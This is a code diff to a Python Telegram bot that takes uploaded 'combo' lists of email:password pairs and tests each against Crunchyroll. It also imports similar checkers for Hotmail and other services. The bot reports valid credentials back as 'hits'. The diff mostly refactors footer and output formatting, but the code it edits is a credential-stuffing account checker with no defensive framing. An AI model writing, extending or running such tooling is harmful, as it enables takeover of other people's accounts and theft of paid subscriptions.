@@ -6,7 +6,7 @@ from telebot import types
 from nonsk4 import check_nonsk4, get_footer_info as nonsk4_footer_info
 from gpt import check_gpt, get_footer_info as gpt_footer_info
 #import crunchy
-from crunchy import check_crunchy, get_footer_info as crunchy_footer_info
+from crunchy import check_crunchy, get_footer_info
 import os
 import sys
 import hotmail
@@ -233,13 +233,13 @@ def crunchy_command(message):
 
 def process_crunchy(chat_id, username, file_content):
     total_accounts = file_content.splitlines()
-    start_time = time.time()  # Start time right before processing
+    start_time = time.time()
 
     hits = []
     dead = []
 
     initial_message = "Checking Your Accounts...\n\n"
-    footer_info = crunchy_footer_info(len(total_accounts), start_time, username)  # Updated alias name
+    footer_info = get_footer_info(len(total_accounts), start_time, username)
 
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton(f"Hit ✅: 0", callback_data=f"{chat_id}:hit"))
@@ -250,6 +250,7 @@ def process_crunchy(chat_id, username, file_content):
     for account in total_accounts:
         email, password = account.split(":", 1)
         result, response_message = check_crunchy(email, password)
+
         if result == 'Hit':
             hits.append(f"<code>{account}</code>")
         else:
@@ -266,12 +267,7 @@ def process_crunchy(chat_id, username, file_content):
             f"➣Combo: {account}\n"
             f"➣Result: {result}\n"
             f"➣Response: {response_message}\n"
-            f"➣Email Verified: {response_message.get('email_verified', 'N/A')}\n"
-            f"➣Account Creation Date: {response_message.get('account_creation_date', 'N/A')}\n"
-            f"➣Subscription Name: {response_message.get('subscription_name', 'N/A')}\n"
-            f"➣Currency: {response_message.get('currency', 'N/A')}\n"
-            f"➣Subscription Amount: {response_message.get('subscription_amount', 'N/A')}\n\n"
-            f"{footer_info}"
+            f"{get_footer_info(len(total_accounts), start_time, username)}"
         )
 
         markup = types.InlineKeyboardMarkup()
@@ -283,7 +279,7 @@ def process_crunchy(chat_id, username, file_content):
             message_id=msg.message_id,
             text=live_update,
             reply_markup=markup,
-            parse_mode='HTML'  # Enable HTML parsing
+            parse_mode='HTML'
         )
 
     final_message = (
@@ -312,10 +308,11 @@ def callback_query(call):
 
     if cmd == 'hit':
         hits_list = '\n'.join(chat_data[chat_id].get('hits', [])) if chat_data[chat_id].get('hits') else 'No hits yet.'
-        bot.send_message(chat_id, f"↯ HITS\n{hits_list}", parse_mode='HTML')
+        bot.send_message(chat_id, f"↯ HITS\n\n{hits_list}", parse_mode='HTML')
+
     elif cmd == 'dead':
         dead_list = '\n'.join(chat_data[chat_id].get('dead', [])) if chat_data[chat_id].get('dead') else 'No dead accounts yet.'
-        bot.send_message(chat_id, f"↯ DEAD\n{dead_list}", parse_mode='HTML')
+        bot.send_message(chat_id, f"↯ DEAD\n\n{dead_list}", parse_mode='HTML')
         
 @bot.message_handler(commands=['hotmail'])
 def hotmail_command(message):
